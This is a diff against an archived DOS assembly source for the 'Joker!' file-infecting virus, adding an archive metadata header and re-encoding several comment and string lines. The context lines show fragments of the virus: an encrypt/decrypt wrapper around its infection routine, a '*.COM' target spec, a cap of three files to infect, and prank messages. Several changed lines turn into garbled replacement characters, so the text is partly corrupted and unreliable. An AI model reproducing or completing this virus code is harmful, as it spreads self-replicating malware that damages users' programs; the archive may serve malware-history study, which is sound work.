@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      J
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 	title " Joker! virus.  Written by The BOOT SECTOR Infector ... "
 ;
 ; Joker - This is a remake of the deceased "Joker/Jocker" virus.  The original
@@ -65,7 +76,7 @@ infect:		call	cryptor				;Encrypt code
 		call	cryptor				;Decrypt code
 		ret					;Go back
 
-toec:;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄTop Of Encrypted Code
+toec:;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Top Of Encrypted Code
 InfectIt:	push	cx				;Save CX for sub
 		jmp	infect
 
@@ -479,7 +490,7 @@ msg11	db	'No!',cr,lf,cr,lf,'$'
 msg12	db	'Panic kernal mode interrupt$'
 
 	db	WaitKey		;Waits for a keypress, then runs the program
-msg13	db	'CONNECT 1200«',cr,lf,cr,lf,'$'
+msg13	db	'CONNECT 1200ï¿½',cr,lf,cr,lf,'$'
 
 	db	return2host	;Runs host program immediately
 msg14	db	'Okay, okay!  Be patient! ...',cr,lf,'$'
@@ -500,7 +511,7 @@ msg18	db	'Cum on!  Talk DIRTY to me !!!',cr,lf,'$'
 msg19	db	'Your coprocessor wears floppy disks!',cr,lf,'$'
 
 	db	PauseKey	;Waits for keypress (SAKWR), then runs host prg
-msg20	db	'Joker! ver àà by TBSI!',cr,lf
+msg20	db	'Joker! ver ï¿½ï¿½ by TBSI!',cr,lf
 	db	'Remember!  EVERYTHING',39,'s bigger in Texas!',cr,lf,'$'
 
 int24handler:	xor	al,al				;Ignore the error
@@ -511,7 +522,7 @@ filespec:	db	'*.COM',0			;File specification
 prevdir:	db	'..',0				;previous directory
 max2kill	db	3				;max. files to infect
 
-eoec:;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄEnd Of Encrypted Code
+eoec:;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½End Of Encrypted Code
 VersionNumber	dw	100h				;Version 1.00
 encrypt_val	db	0				;1st-run copy only
 
